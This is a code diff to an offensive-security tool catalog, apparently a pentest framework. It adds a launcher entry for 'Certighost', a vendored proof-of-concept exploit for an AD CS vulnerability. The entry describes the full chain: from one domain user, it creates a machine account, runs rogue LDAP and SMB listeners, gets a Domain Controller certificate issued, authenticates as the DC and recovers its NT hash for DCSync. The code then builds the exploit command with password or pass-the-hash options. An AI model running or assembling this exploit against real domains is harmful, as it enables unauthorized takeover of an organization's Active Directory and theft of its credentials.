@@ -10,7 +10,9 @@ Wordlist defaults point at paths present on a default Kali install.
 """
 from __future__ import annotations
 
+import os as _os
 import re as _re
+import sys as _sys
 from typing import Any
 
 from ..facts import HarvestRule
@@ -23,6 +25,9 @@ WL_USERS = "/usr/share/seclists/Usernames/top-usernames-shortlist.txt"
 WL_ROCKYOU = "/usr/share/wordlists/rockyou.txt"
 # Matches a bare subdomain/host on its own line (subfinder/amass -silent output).
 _SUBDOMAIN_RE = r"^([a-z0-9][a-z0-9._\-]*\.[a-z]{2,})$"
+# Vendored external PoC scripts (run via the current interpreter).
+_CERTIGHOST_POC = _os.path.join(_os.path.dirname(_os.path.abspath(__file__)),
+                                "ext", "certighost.py")
 
 
 def _s(v: Any) -> str:
@@ -408,6 +413,38 @@ CATALOG: list[CommandSpec] = [
                               "-dc-ip", _s(k["target"]),
                               f"{_s(k['domain'])}/{_s(k['username'])}:{_s(k['password'])}"],
         install_hint="pipx install impacket.",
+    ),
+    CommandSpec(
+        name="certighost",
+        description="Certighost (CVE-2026-54121) — AD CS 'chase' abuse. From one "
+                    "domain user, create a machine account, run rogue LDAP(389)+LSA/"
+                    "SMB(445) listeners, and request a certificate with poisoned "
+                    "cdc/rmd attributes so the CA issues a Domain Controller "
+                    "certificate; then PKINIT as that DC and recover its NT hash "
+                    "(-> DCSync). Requires ROOT (binds 445+389, so free them first) "
+                    "and a domain credential. Vendored PoC (H0j3n/aniqfakhrul).",
+        binary=_sys.executable, category="ad-smb",
+        parameters=_params({**_TARGET, **_DOMAIN, **_AUTH_H,
+            "ca": {"type": "string", "description": "CA name (optional; auto-discovered via LDAP)."},
+            "ca_ip": {"type": "string", "description": "CA IP (optional; auto-resolved)."},
+            "target_san": {"type": "string", "description": "Computer account to impersonate, e.g. DC01$ (optional; defaults to a discovered DC)."},
+            "template": {"type": "string", "description": "Certificate template (default Machine)."},
+            "listener": {"type": "string", "description": "Attacker IP for the rogue servers (optional; auto-detected)."}},
+            ["target", "domain", "username"]),
+        # --dc-ip is the launch target; auth is password OR pass-the-hash.
+        build_args=lambda k: [_CERTIGHOST_POC, "-d", _s(k["domain"]),
+                              "-u", _s(k["username"]), "--dc-ip", _s(k["target"])]
+                             + (["-H", _s(k["hash"])] if k.get("hash")
+                                else ["-p", _s(k.get("password", ""))])
+                             + (["--ca", _s(k["ca"])] if k.get("ca") else [])
+                             + (["--ca-ip", _s(k["ca_ip"])] if k.get("ca_ip") else [])
+                             + (["--target-san", _s(k["target_san"])] if k.get("target_san") else [])
+                             + (["--template", _s(k["template"])] if k.get("template") else [])
+                             + (["--listener", _s(k["listener"])] if k.get("listener") else []),
+        timeout=1200,
+        install_hint="Vendored at tools/ext/certighost.py; needs impacket, "
+                     "cryptography, asn1crypto, pycryptodomex, dnspython, pyasn1. "
+                     "Run as root with TCP 445+389 free.",
     ),
     CommandSpec(
         name="rbcd",
